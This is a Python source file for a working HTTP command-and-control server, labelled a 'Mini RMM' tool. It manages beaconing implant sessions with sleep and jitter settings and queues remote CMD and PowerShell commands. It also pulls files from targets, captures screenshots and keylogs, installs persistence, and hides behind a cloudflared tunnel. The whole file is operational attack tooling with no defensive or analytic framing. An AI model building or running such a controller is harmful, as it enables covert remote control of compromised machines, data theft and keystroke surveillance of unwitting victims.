#!/usr/bin/env python3
"""
Mini RMM HTTP Server — Compatible with cloudflared quick tunnel
Interactive CLI: install prompt_toolkit (see requirements.txt) for a fixed bottom input line
with client output above; otherwise falls back to readline + input().
Enhanced Features:
- Multi-session management
- Dynamic sleep/jitter configuration
- Tab completion and command history
- One-shot and persistent commands
- File upload/download
- Screenshot capture
- Keylogging support
- Persistence management
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sys
import urllib.parse
import json
import time
import base64
from datetime import datetime
from collections import deque
import os
import readline
import glob

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object  # RMMPTKCompleter only used when prompt_toolkit is installed

# History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
HISTORY_FILE = os.path.expanduser("~/.RMM_history")

# Configuration
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
LOG_DIR = "RMM_logs"
SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")

# Create directories
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)

# ANSI Colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class Session:
    def __init__(self, session_id, hostname, username, ip=None):
        self.id = session_id
        self.hostname = hostname
        self.username = username
        self.ip = ip
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.cmd_queue = deque()
        self.persistent_cmd = None
        self.cmd_timeout = 30
        self.work_dir = None
        self.os_type = "windows"
        # Configuration parameters
        self.sleep_seconds = 60  # Default 1 minute
        self.jitter_percent = 30  # Default 30% jitter
    
    def to_dict(self):
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "ip": self.ip,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "work_dir": self.work_dir,
            "os_type": self.os_type,
            "sleep_seconds": self.sleep_seconds,
            "jitter_percent": self.jitter_percent
        }
    
    def __str__(self):
        return f"{Colors.GREEN}{self.username}@{self.hostname}{Colors.END} [{self.id[:8]}]"

class Completer:
    """Custom completer for readline"""

    def __init__(self, server):
        self.server = server
        self.commands = [
            'list', 'use', 'info', 'background', 'kill',
            'set_sleep', 'set_jitter', 'show_config',
            'download', 'upload', 'screenshot',
            'keylog', 'persist', 'stop',
            'install_persist', 'remove_persist',
            'help', 'clear', 'quit', 'exit',
        ]
        self.keylog_actions = ['start', 'stop', 'dump']

    def complete(self, text, state):
        """Return possible completions for the current text"""
        line = readline.get_line_buffer()
        parts = line.split()
        
        # If no text or first word being completed
        if not parts or (len(parts) == 1 and not line.endswith(' ')):
            matches = [cmd for cmd in self.commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete arguments for specific commands
        cmd = parts[0].lower()
        
        # Complete session IDs for 'use' and 'kill'
        if cmd in ['use', 'kill'] and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            if self.server.sessions:
                session_ids = [sid[:8] for sid in self.server.sessions.keys()]
                matches = [sid for sid in session_ids if sid.startswith(text)]
                if state < len(matches):
                    return matches[state]
            return None
        
        # Complete keylog actions
        if cmd == 'keylog' and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            matches = [action for action in self.keylog_actions if action.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete local files for 'upload'
        if cmd == 'upload' and len(parts) == 2 and not line.endswith(' '):
            # Complete local file path
            matches = glob.glob(text + '*')
            if state < len(matches):
                return matches[state]
            return None
        
        return None


class RMMPTKCompleter(_PTCompleterBase):
    """prompt_toolkit completer mirroring Completer (no readline.get_line_buffer)."""

    def __init__(self, server):
        super().__init__()
        self.server = server
        self._words = Completer(server)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in self._words.commands:
                if cmd.startswith(prefix):
                    yield Completion(cmd + " ", start_position=-len(prefix))
            return

        cmd = parts[0].lower()

        if cmd in ("use", "kill"):
            if len(parts) == 1 and line.endswith(" "):
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    yield Completion(s8 + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    if s8.startswith(prefix):
                        yield Completion(s8, start_position=-len(prefix))
                return

        if cmd == "keylog":
            if len(parts) == 1 and line.endswith(" "):
                for a in self._words.keylog_actions:
                    yield Completion(a + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for a in self._words.keylog_actions:
                    if a.startswith(prefix):
                        yield Completion(a + " ", start_position=-len(prefix))
                return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _build_cli_prompt(server):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    prefix = f"{Colors.DIM}[{ts}]{Colors.END} "
    if server.current_session:
        sess = server.get_session(server.current_session)
        if sess:
            return f"{prefix}{Colors.GREEN}RMM [{sess.id[:8]}] > {Colors.END}"
        server.current_session = None
    return f"{prefix}{Colors.GREEN}RMM > {Colors.END}"


def _run_cli_prompt_toolkit(server, cli):
    """Fixed bottom input line; client output prints above (patch_stdout)."""
    from prompt_toolkit import PromptSession
    from prompt_toolkit.formatted_text import ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.patch_stdout import patch_stdout

    server._cli_use_ptk = True
    session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RMMPTKCompleter(server),
        complete_style="COLUMN",
        enable_history_search=True,
    )
    with patch_stdout():
        while server.running:
            try:
                prompt = _build_cli_prompt(server)
                cmd = session.prompt(ANSI(prompt))
                if not cli.execute_command(cmd):
                    break
            except KeyboardInterrupt:
                # Ctrl+C: cancel current line (like a shell); do not exit the server
                continue
            except EOFError:
                # Ctrl+D: end session (empty buffer in prompt_toolkit)
                server.tty_print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
                break


def _run_cli_readline(server, cli):
    """Fallback: stdlib readline + input() when prompt_toolkit is not installed."""
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(1000)
    completer = Completer(server)
    readline.set_completer(completer.complete)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n;")

    while server.running:
        try:
            prompt = _build_cli_prompt(server)
            cmd = input(prompt)
            if not cli.execute_command(cmd):
                break
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
            break


class RMMServer:
    def __init__(self):
        self.sessions = {}
        self.killed_sessions = set()
        self.session_lock = threading.Lock()
        self.tty_lock = threading.Lock()  # Serialize async client stdout
        self._cli_use_ptk = False  # True when using prompt_toolkit (skip readline.redisplay in handle_result)
        self.current_session = None
        self.running = True

    def tty_print(self, msg="", *, ansi=True, end="\n", flush=True):
        """Stdout for CLI/logs. Under prompt_toolkit.patch_stdout, plain print() corrupts ESC (shows as '?')."""
        if self._cli_use_ptk:
            from prompt_toolkit import print_formatted_text
            if ansi:
                from prompt_toolkit.formatted_text import ANSI
                print_formatted_text(ANSI(msg), end=end)
            else:
                print_formatted_text(msg, end=end)
            if flush:
                sys.stdout.flush()
        else:
            print(msg, end=end, flush=flush)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CMD": Colors.BLUE
        }.get(level, Colors.END)
        self.tty_print(f"{Colors.DIM}[{timestamp}]{Colors.END} {color}[{level}]{Colors.END} {message}")
    
    def save_session(self, session):
        sessions_data = {}
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                sessions_data = json.load(f)
        
        sessions_data[session.id] = session.to_dict()
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_data, f, indent=2)
    
    def get_session(self, session_id):
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def find_session_by_prefix(self, prefix):
        """Find a session by ID prefix (minimum 4 characters)"""
        with self.session_lock:
            matching_sessions = []
            for session_id, session in self.sessions.items():
                if session_id.startswith(prefix):
                    matching_sessions.append((session_id, session))
            
            if len(matching_sessions) == 1:
                return matching_sessions[0][1]
            elif len(matching_sessions) > 1:
                self.tty_print(f"{Colors.YELLOW}Multiple sessions match prefix '{prefix}':{Colors.END}")
                for sid, session in matching_sessions:
                    self.tty_print(f"  {sid[:8]} - {session.username}@{session.hostname}", ansi=False)
                return None
            else:
                return None
    
    def register_session(self, session_id, hostname, username, ip=None):
        with self.session_lock:
            if session_id in self.killed_sessions:
                return None
            if session_id not in self.sessions:
                session = Session(session_id, hostname, username, ip)
                self.sessions[session_id] = session
                self.save_session(session)
                self.log(f"New session: {session}", "SUCCESS")
                return True
            else:
                s = self.sessions[session_id]
                s.last_seen = datetime.now()
                s.hostname = hostname
                s.username = username
                if ip is not None:
                    s.ip = ip
                self.save_session(s)
                return False
    
    def update_session_config(self, session_id, sleep_seconds=None, jitter_percent=None):
        session = self.get_session(session_id)
        if session:
            with self.session_lock:
                if sleep_seconds is not None:
                    session.sleep_seconds = max(1, min(3600, sleep_seconds))
                if jitter_percent is not None:
                    session.jitter_percent = max(0, min(100, jitter_percent))
                self.save_session(session)
            return True
        return False
    
    def list_sessions(self):
        with self.session_lock:
            if not self.sessions:
                self.tty_print(f"{Colors.YELLOW}No active sessions{Colors.END}")
                return

            self.tty_print(f"\n{Colors.BOLD}Active Sessions:{Colors.END}")
            self.tty_print(
                f"{'ID':<10} {'User':<15} {'Hostname':<20} {'Sleep':<8} {'Jitter':<8} {'Last Seen':<20}",
                ansi=False,
            )
            self.tty_print("-" * 85, ansi=False)
            for sid, session in self.sessions.items():
                self.tty_print(
                    f"{sid[:8]:<10} {session.username:<15} {session.hostname:<20} "
                    f"{session.sleep_seconds:<8} {session.jitter_percent:<8}% "
                    f"{session.last_seen.strftime('%Y-%m-%d %H:%M:%S'):<20}",
                    ansi=False,
                )
            self.tty_print("", ansi=False)
    
    def set_command(self, session_id, command, cmd_type="oneshot"):
        session = self.get_session(session_id)
        if not session:
            return False
        with self.session_lock:
            if command == "__STOP__":
                session.persistent_cmd = None
                return True
            if cmd_type == "persistent":
                session.cmd_queue.clear()
                session.persistent_cmd = command
                return True
            session.cmd_queue.append(command)
        return True
    
    def get_command(self, session_id):
        """Return (command_string, response_type) for JSON /cmd responses.
        response_type: none | config | execute | persistent
        One-shot commands are queued (FIFO). Persistent runs until __STOP__.
        """
        with self.session_lock:
            if session_id in self.killed_sessions:
                return ("__EXIT__", "execute")
        session = self.get_session(session_id)
        if not session:
            return ("", "none")
        with self.session_lock:
            if session.persistent_cmd is not None:
                return (session.persistent_cmd, "persistent")
            if session.cmd_queue:
                cmd = session.cmd_queue.popleft()
                return (cmd, "execute")
            config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
            return (config_cmd, "config")

    @staticmethod
    def _unwrap_rmm_result_text(body: str) -> tuple:
        """If client sent JSON {rmm_cmd, rmm_output}, return (text, cmd_echo); else (body, None)."""
        if not body or not body.lstrip().startswith("{"):
            return (body, None)
        try:
            d = json.loads(body)
        except json.JSONDecodeError:
            return (body, None)
        if isinstance(d, dict) and "rmm_output" in d:
            out = d.get("rmm_output", "")
            if out is None:
                out = ""
            elif not isinstance(out, str):
                out = str(out)
            cmd_echo = d.get("rmm_cmd")
            if cmd_echo is not None and not isinstance(cmd_echo, str):
                cmd_echo = str(cmd_echo)
            return (out, cmd_echo)
        return (body, None)

    def handle_result(self, session_id, result, cmd_type="output"):
        session = self.get_session(session_id)
        if not session:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        with self.tty_lock:
            if cmd_type == "file_upload":
                try:
                    data = json.loads(result)
                    filename = data.get("filename", f"unknown_{timestamp}")
                    content = base64.b64decode(data.get("content", ""))
                    filepath = os.path.join(LOG_DIR, "downloads", f"{session.id[:8]}_{filename}")
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    self.log(f"File downloaded: {filepath}", "SUCCESS")
                except Exception as e:
                    self.log(f"Download error: {e}", "ERROR")
            
            elif cmd_type == "screenshot":
                try:
                    content = base64.b64decode(result)
                    filepath = os.path.join(LOG_DIR, "screenshots", f"{session.id[:8]}_{timestamp}.png")
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    self.log(f"Screenshot saved: {filepath}", "SUCCESS")
                except Exception as e:
                    self.log(f"Screenshot error: {e}", "ERROR")
            
            elif cmd_type == "keylog":
                try:
                    filepath = os.path.join(LOG_DIR, "keylogs", f"{session.id[:8]}_{timestamp}.log")
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(result)
                    self.log(f"Keylog saved: {filepath}", "SUCCESS")
                except Exception as e:
                    self.log(f"Keylog save error: {e}", "ERROR")
            
            elif cmd_type == "config_ack":
                self.log(f"Session {session.id[:8]} acknowledged config update", "SUCCESS")
            
            else:
                text, echoed_cmd = self._unwrap_rmm_result_text(result)
                line = f"\n{Colors.DIM}[Result from {session}]"
                if echoed_cmd:
                    line += f" » {echoed_cmd}"
                line += f"{Colors.END}"
                self.tty_print(line)
                self.tty_print(text, ansi=False)
                self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
            
            sys.stdout.flush()
            if not self._cli_use_ptk:
                try:
                    readline.redisplay()
                except Exception:
                    pass

class RMMHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def _respond(self, code, body="", content_type="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if body:
            self.wfile.write(body.encode() if isinstance(body, str) else body)
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)
        
        if path == "/register":
            session_id = qs.get("id", [None])[0]
            hostname = qs.get("h", ["unknown"])[0]
            username = qs.get("u", ["unknown"])[0]
            ip = self.client_address[0]
            
            if session_id:
                reg = self.server_instance.register_session(session_id, hostname, username, ip)
                if reg is None:
                    self._respond(403, "TERMINATED")
                else:
                    self._respond(200, "REGISTERED" if reg else "UPDATED")
            else:
                self._respond(400, "Missing session ID")
        
        elif path == "/cmd":
            session_id = qs.get("id", [None])[0]
            if session_id:
                cmd, resp_type = self.server_instance.get_command(session_id)
                response = json.dumps({"command": cmd, "type": resp_type})
                self._respond(200, response, "application/json")
            else:
                self._respond(400, "Missing session ID")
        
        elif path == "/ping":
            session_id = qs.get("id", [None])[0]
            if session_id:
                self._respond(200, "PONG")
            else:
                self._respond(400, "Missing session ID")
        
        else:
            self._respond(404, "Not Found")
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)
        
        if path == "/result":
            session_id = qs.get("id", [None])[0]
            result_type = qs.get("type", ["output"])[0]
            
            if session_id:
                self.server_instance.handle_result(session_id, body, result_type)
                self._respond(200, "OK")
            else:
                self._respond(400, "Missing session ID")
        
        else:
            self._respond(404, "Not Found")

class CommandInterface:
    def __init__(self, server):
        self.server = server
        self.aliases = {
            "ls": "dir",
            "help": "?",
            "sessions": "list",
            "exit": "quit"
        }
    
    def show_help(self):
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.END}

{Colors.CYAN}Session Management:{Colors.END}
  {Colors.GREEN}list{Colors.END}                     - List active sessions
  {Colors.GREEN}use <session_id>{Colors.END}         - Select a session (full ID or first 4+ chars)
  {Colors.GREEN}info{Colors.END}                     - Show current session info
  {Colors.GREEN}background{Colors.END}               - Return to global view
  {Colors.GREEN}kill <session_id>{Colors.END}        - End session and stop the remote client

{Colors.CYAN}Beacon Configuration:{Colors.END}
  {Colors.GREEN}set_sleep <seconds>{Colors.END}      - Set beacon interval (1-3600 seconds)
  {Colors.GREEN}set_jitter <percent>{Colors.END}     - Set jitter percentage (0-100)
  {Colors.GREEN}show_config{Colors.END}              - Show current session config

{Colors.CYAN}Command Execution:{Colors.END}
  {Colors.DIM}(commands queue FIFO between client polls){Colors.END}
  {Colors.DIM}Windows CMD: use double quotes for paths with spaces; NET GROUP needs group name before /domain.{Colors.END}
  {Colors.GREEN}<command>{Colors.END}                - CMD (cmd.exe), e.g. sc query, dir /w
  {Colors.GREEN}PS: / powershell: <script>{Colors.END}   - Windows PowerShell (powershell.exe)
  {Colors.GREEN}pwsh: <script>{Colors.END}           - PowerShell 7 if pwsh is installed
  {Colors.GREEN}cmd: <line>{Colors.END}             - Explicit CMD (same as default)
  {Colors.GREEN}shell <command>{Colors.END}          - Same as a bare command
  {Colors.GREEN}persist <command>{Colors.END}        - Persistent command (repeats)
  {Colors.GREEN}stop{Colors.END}                     - Stop persistent command

{Colors.CYAN}File Operations:{Colors.END}
  {Colors.GREEN}download <file>{Colors.END}          - Download file from target
  {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target

{Colors.CYAN}Reconnaissance:{Colors.END}
  {Colors.GREEN}screenshot{Colors.END}               - Capture screenshot
  {Colors.GREEN}keylog start/stop/dump{Colors.END}   - Keylogging operations

{Colors.CYAN}Persistence:{Colors.END}
  {Colors.GREEN}install_persist{Colors.END}          - Install persistence
  {Colors.GREEN}remove_persist{Colors.END}           - Remove persistence

{Colors.CYAN}Other:{Colors.END}
  {Colors.GREEN}clear{Colors.END}                    - Clear screen
  {Colors.GREEN}quit{Colors.END}                     - Exit RMM server

{Colors.YELLOW}Tip:{Colors.END} Use TAB key for command completion and history navigation
"""
        self.server.tty_print(help_text)
    
    def execute_command(self, cmd_line):
        if not cmd_line.strip():
            return True

        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []

        # Handle aliases
        cmd = self.aliases.get(cmd, cmd)

        # Global commands
        if cmd in ["quit", "exit"]:
            self.server.tty_print(f"{Colors.YELLOW}Shutting down server...{Colors.END}")
            if not getattr(self.server, "_cli_use_ptk", False):
                readline.write_history_file(HISTORY_FILE)
            self.server.running = False
            return False

        elif cmd == "list":
            self.server.list_sessions()

        elif cmd == "kill":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    with self.server.session_lock:
                        self.server.killed_sessions.add(session.id)
                        del self.server.sessions[session.id]
                        self.server.tty_print(f"{Colors.GREEN}Session {session.id[:8]} terminated (client will exit on next beacon){Colors.END}")
                        if self.server.current_session == session.id:
                            self.server.current_session = None
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: kill <session_id>{Colors.END}")

        elif cmd == "use":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    self.server.current_session = session.id
                    self.server.tty_print(f"{Colors.GREEN}Selected session: {session}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
                    self.server.tty_print(f"{Colors.YELLOW}Use 'list' to see available sessions{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: use <session_id>{Colors.END}")
                self.server.tty_print(f"{Colors.YELLOW}You can use full ID or first 4+ characters (e.g., 'use 2318'){Colors.END}")

        elif cmd == "info":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    self.server.tty_print(f"\n{Colors.BOLD}Session Information:{Colors.END}")
                    self.server.tty_print(f"  ID: {session.id}", ansi=False)
                    self.server.tty_print(f"  User: {session.username}", ansi=False)
                    self.server.tty_print(f"  Hostname: {session.hostname}", ansi=False)
                    self.server.tty_print(f"  IP: {session.ip or 'N/A'}", ansi=False)
                    self.server.tty_print(f"  First Seen: {session.first_seen}", ansi=False)
                    self.server.tty_print(f"  Last Seen: {session.last_seen}", ansi=False)
                    self.server.tty_print(f"  Working Dir: {session.work_dir or 'Unknown'}", ansi=False)
                    self.server.tty_print(f"  OS: {session.os_type}", ansi=False)
                    self.server.tty_print(f"  Sleep Interval: {session.sleep_seconds} seconds", ansi=False)
                    self.server.tty_print(f"  Jitter: {session.jitter_percent}%\n", ansi=False)
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "show_config":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    jitter_range = session.sleep_seconds * session.jitter_percent / 100
                    min_sleep = session.sleep_seconds - jitter_range
                    max_sleep = session.sleep_seconds + jitter_range
                    self.server.tty_print(f"\n{Colors.BOLD}Current Beacon Configuration:{Colors.END}")
                    self.server.tty_print(f"  Session: {session.id[:8]}", ansi=False)
                    self.server.tty_print(
                        f"  Sleep Interval: {Colors.GREEN}{session.sleep_seconds}{Colors.END} seconds"
                    )
                    self.server.tty_print(
                        f"  Jitter Percentage: {Colors.GREEN}{session.jitter_percent}{Colors.END}%"
                    )
                    self.server.tty_print(
                        f"  Effective Range: {Colors.CYAN}{min_sleep:.1f}{Colors.END} - "
                        f"{Colors.CYAN}{max_sleep:.1f}{Colors.END} seconds\n"
                    )
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "set_sleep":
            if self.server.current_session:
                if args:
                    try:
                        new_sleep = int(args[0])
                        if 1 <= new_sleep <= 3600:
                            self.server.update_session_config(self.server.current_session, sleep_seconds=new_sleep)
                            self.server.tty_print(f"{Colors.GREEN}Sleep interval updated to {new_sleep} seconds{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Sleep must be between 1 and 3600 seconds{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_sleep <seconds (1-3600)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "set_jitter":
            if self.server.current_session:
                if args:
                    try:
                        new_jitter = int(args[0])
                        if 0 <= new_jitter <= 100:
                            self.server.update_session_config(self.server.current_session, jitter_percent=new_jitter)
                            self.server.tty_print(f"{Colors.GREEN}Jitter updated to {new_jitter}%{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Jitter must be between 0 and 100{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_jitter <percent (0-100)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "background":
            self.server.current_session = None
            self.server.tty_print(f"{Colors.GREEN}Returned to global view{Colors.END}")

        elif cmd == "help" or cmd == "?":
            self.show_help()

        elif cmd == "clear":
            os.system('clear' if os.name == 'posix' else 'cls')

        # Commands that require a selected session
        elif self.server.current_session:
            if cmd in ["shell", "exec"]:
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: shell <command>{Colors.END}")

            elif cmd == "persist":
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "persistent")
                    self.server.tty_print(f"{Colors.DIM}Persistent command activated (use 'stop' to end){Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: persist <command>{Colors.END}")

            elif cmd == "stop":
                self.server.set_command(self.server.current_session, "__STOP__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Persistent command stopped{Colors.END}")

            elif cmd == "download":
                if args:
                    filepath = args[0]
                    command = f"__DOWNLOAD__ {filepath}"
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Downloading {filepath}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")

            elif cmd == "upload":
                if len(args) >= 2:
                    local_file = args[0]
                    remote_file = args[1]
                    if os.path.exists(local_file):
                        with open(local_file, 'rb') as f:
                            content = base64.b64encode(f.read()).decode()
                        data = json.dumps({
                            "filename": os.path.basename(remote_file),
                            "content": content
                        })
                        self.server.set_command(self.server.current_session, f"__UPLOAD__ {remote_file}\n{data}", "oneshot")
                        self.server.tty_print(f"{Colors.DIM}Uploading {local_file} to {remote_file}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}Local file not found: {local_file}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: upload <local_file> <remote_file>{Colors.END}")

            elif cmd == "screenshot":
                self.server.set_command(self.server.current_session, "__SCREENSHOT__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Taking screenshot...{Colors.END}")

            elif cmd in ["keylog", "keylogger"]:
                if args:
                    action = args[0]
                    self.server.set_command(self.server.current_session, f"__KEYLOG__ {action}", "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Keylog {action}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: keylog start/stop/dump{Colors.END}")

            elif cmd == "install_persist":
                self.server.set_command(self.server.current_session, "__INSTALL_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Installing persistence...{Colors.END}")

            elif cmd == "remove_persist":
                self.server.set_command(self.server.current_session, "__REMOVE_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Removing persistence...{Colors.END}")

            else:
                # Regular shell command
                self.server.set_command(self.server.current_session, cmd_line, "oneshot")
                self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")

        else:
            self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'list' then 'use <id>' or type 'help'{Colors.END}")
            self.server.tty_print(f"{Colors.YELLOW}Tip: You can use the first 4-8 characters of the session ID (e.g., 'use 2318'){Colors.END}")

        return True

def main():
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("""
    ╔═══════════════════════════════════════════╗
    ║        Mini RMM Server v2.2                ║
    ║     HTTP Command & Control                 ║
    ║   Dynamic Sleep/Jitter + Tab Completion    ║
    ╚═══════════════════════════════════════════╝
    """ + Colors.END)

    server = RMMServer()
    RMMHandler.server_instance = server

    http_server = HTTPServer(("0.0.0.0", PORT), RMMHandler)

    print(f"{Colors.GREEN}[*] RMM listening on 0.0.0.0:{PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] Start tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Logs saved to: {LOG_DIR}{Colors.END}")
    print(f"{Colors.BLUE}[*] Default beacon interval: 60 seconds with 30% jitter{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Features: Tab completion, Command history, Multi-session{Colors.END}\n")
    
    # Start HTTP server
    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()
    
    # Command interface
    cli = CommandInterface(server)
    
    # Do not install SIGINT: Ctrl+C must reach the CLI as KeyboardInterrupt so it can
    # cancel the current line (prompt_toolkit / readline). Use `quit` or Ctrl+D to exit.

    print(f"{Colors.BOLD}Type 'help' for available commands{Colors.END}")
    try:
        __import__("prompt_toolkit")
        _have_ptk = True
    except ImportError:
        _have_ptk = False

    if _have_ptk:
        print(
            f"{Colors.YELLOW}Tip: Client output scrolls above; your input line stays fixed at the bottom.{Colors.END}\n"
        )
        _run_cli_prompt_toolkit(server, cli)
    else:
        print(
            f"{Colors.CYAN}[*] pip install -r requirements.txt for the fixed bottom prompt (prompt_toolkit).{Colors.END}\n"
        )
        _run_cli_readline(server, cli)

    if not getattr(server, "_cli_use_ptk", False):
        readline.write_history_file(HISTORY_FILE)
    http_server.shutdown()

if __name__ == "__main__":
    main()
